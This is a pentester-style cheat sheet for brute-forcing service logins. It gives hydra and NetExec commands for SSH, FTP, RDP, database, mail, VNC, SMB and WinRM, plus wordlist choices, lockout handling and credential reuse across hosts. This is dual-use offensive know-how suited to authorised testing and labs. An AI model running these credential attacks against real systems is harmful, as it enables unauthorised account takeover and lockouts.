# Brute force

## Before I start
- [ ] A web login form: :Pb login-forms instead
- [ ] A domain account: spray it instead, under the lockout threshold, with :Pb spraying
- [ ] The lockout policy read where I can, and every guess counted against it
At the pwn-broker prompt: tool install netexec.
nxc smb <TargetIP> -u '' -p '' --pass-pol
- [ ] Usernames from enumeration in users.txt, one per line
- [ ] Passwords found anywhere on the box in passwords.txt, tried before any big list

## Cheap guesses first
Empty, the username itself, and the username reversed:
hydra -L users.txt -e nsr -t 4 ssh://<TargetIP>
Default pairs for the service, from SecLists:
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://<TargetIP>
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://<TargetIP> -t 4
- [ ] The others in Default-Credentials/: mysql, postgres, mssql, telnet, vnc, windows
hydra -L users.txt -P passwords.txt ssh://<TargetIP> -t 4

## One user, a big list
hydra -l '<Username>' -P /usr/share/wordlists/rockyou.txt ssh://<TargetIP> -t 4 -f
On another port:
hydra -l '<Username>' -P /usr/share/wordlists/rockyou.txt -s <Port> ssh://<TargetIP> -t 4 -f
A shorter list first, when rockyou would take too long:
hydra -l '<Username>' -P /usr/share/wordlists/dirb/others/best1050.txt ssh://<TargetIP> -t 4 -f

## By service
hydra -L users.txt -P passwords.txt ftp://<TargetIP>
hydra -L users.txt -P passwords.txt rdp://<TargetIP> -t 4
hydra -L users.txt -P passwords.txt mysql://<TargetIP>
hydra -L users.txt -P passwords.txt mssql://<TargetIP>
hydra -L users.txt -P passwords.txt postgres://<TargetIP>
hydra -L users.txt -P passwords.txt telnet://<TargetIP>
hydra -L users.txt -P passwords.txt pop3://<TargetIP>
hydra -L users.txt -P passwords.txt imap://<TargetIP>
VNC has a password and no username:
hydra -P /usr/share/wordlists/rockyou.txt vnc://<TargetIP>
SMB and WinRM with NetExec, since hydra's smb module speaks only SMBv1:
nxc smb <TargetIP> -u users.txt -p passwords.txt --local-auth --continue-on-success
nxc winrm <TargetIP> -u users.txt -p passwords.txt --local-auth --continue-on-success
- [ ] Module options, for a service not listed here: hydra -U THE-MODULE

## Options I reach for
- [ ] -f stops at the first hit; -o hits.txt keeps the hits; -V shows every attempt
- [ ] -t 4 for SSH and RDP, which drop connections at hydra's default of 16
- [ ] Unsure of the lockout: -t 1 -W 5, one thread and 5 seconds between attempts
- [ ] A service on TLS: -S, or its own module, such as pop3s:// or imaps://
- [ ] An interrupted run picks up again with hydra -R

## A hit
- [ ] The pair tried on every other service on the box, and on every other host: :Pb spraying
nxc ssh <TargetIP> -u '<Username>' -p '<Password>'
ssh '<Username>'@<TargetIP>
